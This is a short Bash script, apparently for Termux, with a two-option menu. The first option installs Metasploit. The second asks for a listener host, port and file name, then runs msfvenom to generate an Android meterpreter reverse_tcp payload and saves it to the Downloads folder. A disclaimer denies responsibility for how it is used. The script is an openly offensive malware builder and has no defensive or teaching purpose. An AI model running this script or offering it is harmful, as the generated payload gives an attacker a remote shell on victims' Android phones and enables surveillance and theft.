clear
figlet welcome 
neofetch

echo -e "\e[1mI AM NOT RESPONSBLE WITH UR ACTIVITYS\e[0m"
sleep 3

echo " "


echo "Install Metasploit ~>1		Payload generator(Android) ~>2"  

echo " "

read -p  "so what u want today? : " var

main() {
	if [ $var == 1 ];
	then
		apt-get update -y
		apt-get upgrade -y
		pkg install neofetch -y
		apt-get install unstable-repo -y
		pkg install metasploit -y
	elif [ $var == 2 ];
	then
		clear
		figlet PAYLOAD
		echo " "
		read -p "enter lhost ~> " lhost
		read -p "enter lport ~> " lport
		read -p "enter a name for ur payload ~> " name
		echo -e "\e[1mGenerating android payload now this may take some time, plz wait\e[1m"
	       	msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport > storage/downloads/$name
	else
		echo "invalid option QUITTING"
		figlet bye
	fi
}

main 




